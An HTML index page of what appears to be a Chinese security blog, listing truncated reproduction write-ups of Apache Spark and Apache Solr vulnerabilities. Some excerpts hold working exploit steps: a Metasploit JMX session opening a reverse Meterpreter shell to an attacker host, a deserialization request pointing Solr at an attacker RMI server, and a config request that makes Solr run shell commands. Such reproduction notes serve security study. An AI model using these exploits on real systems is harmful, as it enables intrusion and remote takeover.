<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>She11c0de&#39;s blogs</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="She11c0de&#39;s blogs">
<meta property="og:url" content="https://she11c0de.github.io/page/95/index.html">
<meta property="og:site_name" content="She11c0de&#39;s blogs">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="She11c0de">
<meta name="twitter:card" content="summary">
  
  
    <link rel="icon" href="/favicon.png">
  
  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
  
<link rel="stylesheet" href="/css/style.css">

  
<link rel="stylesheet" href="/css/scrollUp/image.css">

  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
  
<meta name="generator" content="Hexo 5.4.2"></head>
<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <div class="logo">
        <img src="/logo.png" alt="Profile Picture">
      </div>
      <div id="title">She11c0de's blogs</div>
      
       <ul class="my-socials">
  
 
</ul>
    </div>
  </div>
  <div id="header-inner" class="">
    <nav id="main-nav">
      <a id="main-nav-toggle" class="nav-icon"></a>
      <!--
        
          
            <a class="main-nav-link" href="/">首页</a>
          
            <a class="main-nav-link" href="/categories/life">生活</a>
          
            <a class="main-nav-link" href="/archives">归档</a>
          
        
      -->
    </nav>
    <nav id="title-nav" style="display:none">
      <a href="/">She11c0de&#39;s blogs</a>
      <img src="/logo.png" alt="Profile Picture">
      <!--
      <span id="title-nav-socials">
        
       
     </span>
      -->
    </nav>
    <nav id="sub-nav">
      
      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
    </nav>
    <div id="search-form-wrap">
      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
        <input type="submit" value="" class="search-form-submit">
        <input name=tn type=hidden value="bds">
        <input name=cl type=hidden value="3">
        <input name=ct type=hidden value="2097152">
        <input type="hidden" name="si" value="she11c0de.github.io">
      </form>
    </div>
  </div>
  <div class="site-nav" style="display: none;">
    <ul>
      
      
        <li><a href="/">首页</a></li>
      
        <li><a href="/categories/life">生活</a></li>
      
        <li><a href="/archives">归档</a></li>
      
      
    </ul>
  </div>
</header>
      <div class="outer">
        <section id="main">
  

    
    <article id="post-Apache Spark/Apache Spark 未授权访问漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/Apache%20Spark/Apache%20Spark%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time datetime="2022-07-08T06:25:52.940Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Apache-Spark-未授权访问漏洞"><a href="#Apache-Spark-未授权访问漏洞" class="headerlink" title="Apache Spark 未授权访问漏洞"></a>Apache Spark 未授权访问漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>Apache<br>Spark是一款集群计算系统，其支持用户向管理节点提交应用，并分发给集群执行。如果管理节点未启动ACL（访问控制），我们将可以在集群中执行任意代码。</p>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>该漏洞本质是未授权的用户可以向管理节点提交一个应用，这个应用实际上是恶意代码。</p>
<p>提交方式有两种：</p>
<ul>
<li>  利用REST API</li>
<li>  利用submissions网关（集成在7077端口中）</li>
</ul>
<p>应用可以是Java或Python，就是一个最简单的类，</p>
        
          <p class="article-more-link">
            <a href="/2022/07/07/Apache%20Spark/Apache%20Spark%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/Apache%20Spark/Apache%20Spark%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qml20023y8v132qcehn9" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-Apache Solr/（CVE-2019-17558）Apache Solr 代码注入漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/Apache%20Solr/%EF%BC%88CVE-2019-17558%EF%BC%89Apache%20Solr%20%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time datetime="2022-07-08T06:25:52.847Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="（CVE-2019-17558）Apache-Solr-代码注入漏洞"><a href="#（CVE-2019-17558）Apache-Solr-代码注入漏洞" class="headerlink" title="（CVE-2019-17558）Apache Solr 代码注入漏洞"></a>（CVE-2019-17558）Apache Solr 代码注入漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>Apache Solr<br>5.0.0版本至8.3.1版本中存在代码注入漏洞。攻击者通过未授权访问solr服务器，发送特定的数据包开启paramsresource.loader.enabled，然后get访问接口导致服务器命令执行，命令回显结果在response</p>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Apache Solr 5.0.0版本至8.3.1</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><pre><code>https://www.apache.org/dyn/closer.lua/lucene/solr/7.7.2
https://mirrors.tuna.tsinghua.edu.cn/apache/lucene/solr/7.7.2/solr-7.7.2.zip
</code></pre>
<h4 id="velocity-solrresource-loader-enabled-true"><a href="#velocity-solrresource-loader-enabled-true" class="headerlink" title="velocity.solrresource.loader.enabled:true"></a>velocity.solrresource.loader.enabled:true</h4><pre><code>/opt/solr-7.7.2/example/example-DIH/solr/atom/conf/solrconfig.xml
root@kali:/opt/solr-7.7.2/example/example-DIH/solr/atom/conf# cat solrconfig.xml | grep enable
    &lt;enableLazyFieldLoading&gt;true&lt;/enableLazyFieldLoading&gt;
    &lt;str name=&quot;solrresource.loader.enabled&quot;&gt;$&#123;velocity.solrresource.loader.enabled:false&#125;&lt;/str&gt;
    &lt;str name=&quot;paramsresource.loader.enabled&quot;&gt;$&#123;velocity.paramsresource.loader.enabled:false&#125;&lt;/str&gt;
root@kali:/opt/solr-7.7.2/example/example-DIH/solr/atom/conf#
</code></pre>
        
          <p class="article-more-link">
            <a href="/2022/07/07/Apache%20Solr/%EF%BC%88CVE-2019-17558%EF%BC%89Apache%20Solr%20%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/Apache%20Solr/%EF%BC%88CVE-2019-17558%EF%BC%89Apache%20Solr%20%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qmfo0021y8v13ibc3dh4" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-Apache Solr/（CVE-2019-12409）Apache Solr 远程命令执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/Apache%20Solr/%EF%BC%88CVE-2019-12409%EF%BC%89Apache%20Solr%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time datetime="2022-07-08T06:25:52.844Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="（CVE-2019-12409）Apache-Solr-JMX-远程命令执行漏洞"><a href="#（CVE-2019-12409）Apache-Solr-JMX-远程命令执行漏洞" class="headerlink" title="（CVE-2019-12409）Apache Solr JMX 远程命令执行漏洞"></a>（CVE-2019-12409）Apache Solr JMX 远程命令执行漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p><strong>Linux</strong> 下的环境下的Apache Solr 8.1.1和8.2.0版本</p>
<p>存在默认不安全配置在<em><strong>solr.sh</strong></em><code>ENABLE_REMOTE_JMX_OPTS=&quot;true&quot;</code>,将导致启用JMX监视服务并将公网监听一个18983的RMI端口，且无需进行任何身份验证。</p>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Apache Solr 8.1.1和8.2.0版本</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><pre><code>msf5 &gt; use multi/misc/java_jmx_server
msf5 exploit(multi/misc/java_jmx_server) &gt; show options

Module options (exploit/multi/misc/java_jmx_server):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   JMXRMI        jmxrmi           yes       The name where the JMX RMI interface is bound
   JMX_PASSWORD                   no        The password to interact with an authenticated JMX endpoint
   JMX_ROLE                       no        The role to interact with an authenticated JMX endpoint
   RHOSTS                         yes       The target address range or CIDR identifier
   RPORT                          yes       The target port (TCP)
   SRVHOST       0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT       8080             yes       The local port to listen on.
   SSLCert                        no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                        no        The URI to use for this exploit (default is random)


Exploit target:

   Id  Name
   --  ----
   0   Generic (Java Payload)


msf5 exploit(multi/misc/java_jmx_server) &gt; set RHOSTS a.a.a.a
RHOSTS =&gt; a.a.a.a
msf5 exploit(multi/misc/java_jmx_server) &gt; set RPORT 18983
RPORT =&gt; 18983
msf5 exploit(multi/misc/java_jmx_server) &gt; set payload java/meterpreter/reverse_tcp
payload =&gt; java/meterpreter/reverse_tcp
msf5 exploit(multi/misc/java_jmx_server) &gt; show options

Module options (exploit/multi/misc/java_jmx_server):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   JMXRMI        jmxrmi           yes       The name where the JMX RMI interface is bound
   JMX_PASSWORD                   no        The password to interact with an authenticated JMX endpoint
   JMX_ROLE                       no        The role to interact with an authenticated JMX endpoint
   RHOSTS        a.a.a.a     yes       The target address range or CIDR identifier
   RPORT         18983            yes       The target port (TCP)
   SRVHOST       0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT       8080             yes       The local port to listen on.
   SSLCert                        no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                        no        The URI to use for this exploit (default is random)


Payload options (java/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Generic (Java Payload)


msf5 exploit(multi/misc/java_jmx_server) &gt; set LHOST b.b.b.b
LHOST =&gt; b.b.b.b
msf5 exploit(multi/misc/java_jmx_server) &gt; run
[*] Started reverse TCP handler on b.b.b.b:4444
[*] a.a.a.a:18983 - Using URL: http://b.b.b.b:8080/OcbYS8uaTPDH
[*] a.a.a.a:18983 - Sending RMI Header...
[*] a.a.a.a:18983 - Discovering the JMXRMI endpoint...
[+] a.a.a.a:18983 - JMXRMI endpoint on a.a.a.a:18983
[*] a.a.a.a:18983 - Proceeding with handshake...
[+] a.a.a.a:18983 - Handshake with JMX MBean server on a.a.a.a:18983
[*] a.a.a.a:18983 - Loading payload...
[*] a.a.a.a:18983 - Replied to request for mlet
[*] a.a.a.a:18983 - Replied to request for payload JAR
[*] a.a.a.a:18983 - Executing payload...
[*] a.a.a.a:18983 - Replied to request for payload JAR
[*] Sending stage (53867 bytes) to a.a.a.a
[*] Meterpreter session 1 opened (a.a.a.a:4444 -&gt; b.b.b.b:46582) at 2019-11-21 15:24:53 +0000

meterpreter &gt;
</code></pre>

        
          <p class="article-more-link">
            <a href="/2022/07/07/Apache%20Solr/%EF%BC%88CVE-2019-12409%EF%BC%89Apache%20Solr%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/Apache%20Solr/%EF%BC%88CVE-2019-12409%EF%BC%89Apache%20Solr%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qmfn0020y8v11im35lwh" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-Apache Solr/（CVE-2019-0193）Apache Solr 远程命令执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/Apache%20Solr/%EF%BC%88CVE-2019-0193%EF%BC%89Apache%20Solr%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time datetime="2022-07-08T06:25:52.841Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="（CVE-2019-0193）Apache-Solr-远程命令执行漏洞"><a href="#（CVE-2019-0193）Apache-Solr-远程命令执行漏洞" class="headerlink" title="（CVE-2019-0193）Apache Solr 远程命令执行漏洞"></a>（CVE-2019-0193）Apache Solr 远程命令执行漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>Apache Solr 是一个开源的搜索服务器。Solr 使用 Java 语言开发，主要基于<br>HTTP 和 Apache Lucene 实现。此次漏洞出现在Apache<br>Solr的DataImportHandler，该模块是一个可选但常用的模块，用于从数据库和其他源中提取数据。它具有一个功能，其中所有的DIH配置都可以通过外部请求的dataConfig参数来设置。由于DIH配置可以包含脚本，因此攻击者可以通过构造危险的请求，从而造成远程命令执行。</p>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Apache Solr &lt; 8.2.0</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="poc-一-：需要目标出网，支持低版本检测"><a href="#poc-一-：需要目标出网，支持低版本检测" class="headerlink" title="poc 一 ：需要目标出网，支持低版本检测"></a>poc 一 ：需要目标出网，支持低版本检测</h3><blockquote>
<p>判断该索引库是否使用了DataImportHandler模块</p>
</blockquote>
<ul>
<li><p>访问<br>  <code>http://www.0-sec.org:8983/solr/test_0nth3way/admin/mbeans?cat=QUERY&amp;wt=json</code></p>
</li>
<li><p>如果使用了<code>DataImportHandler</code>模块<br>  则HTTP响应内会有:<code> org.apache.solr.handler.dataimport.DataImportHandler</code></p>
</li>
</ul>
<p>1.png</p>
        
          <p class="article-more-link">
            <a href="/2022/07/07/Apache%20Solr/%EF%BC%88CVE-2019-0193%EF%BC%89Apache%20Solr%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/Apache%20Solr/%EF%BC%88CVE-2019-0193%EF%BC%89Apache%20Solr%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qmfm001yy8v13n5e4q7c" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-Apache Solr/（CVE-2019-0192）Apache Solr Deserialization 远程代码执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/Apache%20Solr/%EF%BC%88CVE-2019-0192%EF%BC%89Apache%20Solr%20Deserialization%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time datetime="2022-07-08T06:25:52.839Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="（CVE-2019-0192）Apache-Solr-Deserialization-远程代码执行漏洞"><a href="#（CVE-2019-0192）Apache-Solr-Deserialization-远程代码执行漏洞" class="headerlink" title="（CVE-2019-0192）Apache Solr Deserialization 远程代码执行漏洞"></a>（CVE-2019-0192）Apache Solr Deserialization 远程代码执行漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>Apache<br>Solr中的ConfigAPI允许设置一个jmx.serviceUrl，它将创建一个新的JMXConnectorServerFactory，并通过”绑定”操作触发对目标RMI/LDAP服务器的调用。恶意的RMI服务器可以响应任意的对象，这些对象将在Solr端使用java的ObjectInputStream反序列化，这被认为是不安全的。这种类型的漏洞可以利用ysoserial工具。根据目标类路径，攻击者可以使用其中一个”gadget<br>chain”来触发Solr端上的远程代码执行。</p>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Apache Solr 5.0.0 to 5.5.5</p>
<p>Apache Solr 6.0.0 to 6.6.5</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>下载Apache Solr<br>5.5.3版本作为靶机（注意，一定要使用jre7u25以下jre），执行<strong>solr -e<br>techproducts -Dcom.sun.management.jmxremote</strong>指令开启服务。</p>
<p>使用ysoserial工具，执行*Java -cp ysoserial-0.0.6-SNAPSHOT-all.jar<br>ysoserial.exploit.JRMPListener 12363 Jdk7u21<br>&quot;calc&quot;<strong>指令，监听</strong>12363***端口。然后传入以下数据：</p>
<pre><code>POST /solr/techproducts/config HTTP/1.1

Host: 0-sec.org:8983

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2

Content-type:application/json

Connection: close

Upgrade-Insecure-Requests: 1

Content-Length: 91

 

&#123;&quot;set-property&quot; : &#123;&quot;jmx.serviceUrl&quot; : &quot;service:jmx:rmi:///jndi/rmi://127.0.0.1:12363/obj&quot;&#125;&#125;
</code></pre>
        
          <p class="article-more-link">
            <a href="/2022/07/07/Apache%20Solr/%EF%BC%88CVE-2019-0192%EF%BC%89Apache%20Solr%20Deserialization%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/Apache%20Solr/%EF%BC%88CVE-2019-0192%EF%BC%89Apache%20Solr%20Deserialization%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qmfn001zy8v15m9l5p4n" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-Apache Solr/（CVE-2017-12629）Apache Solr rce&amp;xxe 漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/Apache%20Solr/%EF%BC%88CVE-2017-12629%EF%BC%89Apache%20Solr%20rce&xxe%20%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time datetime="2022-07-08T06:25:52.836Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="（CVE-2017-12629）Apache-Solr-rce-amp-xxe-漏洞"><a href="#（CVE-2017-12629）Apache-Solr-rce-amp-xxe-漏洞" class="headerlink" title="（CVE-2017-12629）Apache Solr rce&amp;xxe 漏洞"></a>（CVE-2017-12629）Apache Solr rce&amp;xxe 漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Redhat Single Sign-On 7.0+ Redhat Linux 6.2 E sparc+ Redhat Linux 6.2 E i386+ Redhat Linux 6.2 E alpha+ Redhat Linux 6.2 sparc+ Redhat Linux 6.2 i386+ Redhat Linux 6.2 alphaRedhat JBoss Portal Platform 6Redhat JBoss EAP 7 0Redhat Jboss EAP 6Redhat JBoss Data Grid 7.0.0Redhat Enterprise Linux 6+ Trustix Secure Enterprise Linux 2.0+ Trustix Secure Linux 2.2+ Trustix Secure Linux 2.1+ Trustix Secure Linux 2.0Redhat Collections for Red Hat Enterprise Linux 0Apache Solr 6.6.1Apache Solr 6.6Apache Solr 6.5.1Apache Solr 6.5Apache Solr 6.4Apache Solr 6.3Apache Solr 6.2Apache Solr 6.6Apache Solr 6.3Apache Solr 6.0Apache Lucene 0</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="rce-姿势一"><a href="#rce-姿势一" class="headerlink" title="rce 姿势一"></a>rce 姿势一</h3><ul>
<li>  首先创建一个listener，其中设置exe的值为我们想执行的命令，args的值是命令参数：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- --&gt;</span><br></pre></td></tr></table></figure>
<pre><code>POST /solr/demo/config HTTP/1.1
Host: 10.0.83.79:8983
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Length: 158

&#123;&quot;add-listener&quot;:&#123;&quot;event&quot;:&quot;postCommit&quot;,&quot;name&quot;:&quot;newlistener&quot;,&quot;class&quot;:&quot;solr.RunExecutableListener&quot;,&quot;exe&quot;:&quot;sh&quot;,&quot;dir&quot;:&quot;/bin/&quot;,&quot;args&quot;:[&quot;-c&quot;, &quot;touch /tmp/success&quot;]&#125;&#125;
</code></pre>
<p><img src="/resource/(CVE-2017-12629)ApacheSolrrce&xxe%E6%BC%8F%E6%B4%9E/media/rId25.png"></p>
        
          <p class="article-more-link">
            <a href="/2022/07/07/Apache%20Solr/%EF%BC%88CVE-2017-12629%EF%BC%89Apache%20Solr%20rce&xxe%20%E6%BC%8F%E6%B4%9E/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/Apache%20Solr/%EF%BC%88CVE-2017-12629%EF%BC%89Apache%20Solr%20rce&xxe%20%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qmfm001xy8v15gwv2cdx" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-Apache Solr/Apache-Solr 任意文件读取漏洞复现" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/Apache%20Solr/Apache-Solr%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="article-date">
  <time datetime="2022-07-08T06:25:52.834Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Apache-Solr-任意文件读取漏洞复现"><a href="#Apache-Solr-任意文件读取漏洞复现" class="headerlink" title="Apache-Solr 任意文件读取漏洞复现"></a>Apache-Solr 任意文件读取漏洞复现</h1><p>===========================</p>
<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Apache Solr是一个开源的搜索服务，使用Java语言开发。Apache Solr的某些功能存在过滤不严格，在Apache Solr未开启认证的情况下，攻击者可直接构造特定请求开启特定配置，并最终造成SSRF或文件读取漏洞。</p>
<h2 id="漏洞评级"><a href="#漏洞评级" class="headerlink" title="漏洞评级"></a>漏洞评级</h2><p>Apache Solr stream.url SSRF与任意文件读取漏洞 中危</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Apache Solr 所有版本</p>
<h2 id="安全版本"><a href="#安全版本" class="headerlink" title="安全版本"></a>安全版本</h2><p>官方不予修复，暂无安全版本。</p>
        
          <p class="article-more-link">
            <a href="/2022/07/07/Apache%20Solr/Apache-Solr%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/Apache%20Solr/Apache-Solr%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" data-id="cl5c2qmfl001wy8v18t91gcfi" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-Apache Solr/Apache Solr Velocity模版注入远程命令执行" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/Apache%20Solr/Apache%20Solr%20Velocity%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" class="article-date">
  <time datetime="2022-07-08T06:25:52.828Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Apache-Solr-Velocity模版注入远程命令执行"><a href="#Apache-Solr-Velocity模版注入远程命令执行" class="headerlink" title="Apache Solr Velocity模版注入远程命令执行"></a>Apache Solr Velocity模版注入远程命令执行</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>该漏洞的产生是由于两方面的原因：</p>
<p>1、当攻击者可以直接访问Solr控制台时，可以通过发送类似/节点名/config的POST请求对该节点的配置文件做更改。2、2Apache<br>Solr默认集成VelocityResponseWriter插件，在该插件的初始化参数中的paramsresource.loader.enabled这个选项是用来控制是否允许参数资源加载器在Solr请求参数中指定模版，默认设置是false。当设置paramsresource.loader.enabled为true时，将允许用户通过设置请求中的参数来指定相关资源的加载，这也就意味着攻击者可以通过构造一个具有威胁的攻击请求，在服务器上进行命令执行。</p>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>经过测试，目前影响Apache Solr 8.1.1到8.2.0版本。</p>
<p>推测影响全版本Apache Solr。</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="手动检测"><a href="#手动检测" class="headerlink" title="手动检测"></a>手动检测</h3><p>手动检测访问<a target="_blank" rel="noopener" href="http://www.0-sec.org/8983/solr//#/%E8%BF%9B%E5%85%A5%E4%B8%BB%E7%95%8C%E9%9D%A2%EF%BC%8C%E5%8D%95%E5%87%BB%E5%B7%A6%E4%BE%A7%E7%9A%84Core">http://www.0-sec.org/8983/solr/\#/进入主界面，单击左侧的Core</a><br>Selector查看集合名称</p>
        
          <p class="article-more-link">
            <a href="/2022/07/07/Apache%20Solr/Apache%20Solr%20Velocity%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/Apache%20Solr/Apache%20Solr%20Velocity%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" data-id="cl5c2qmfk001vy8v12amk3j89" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
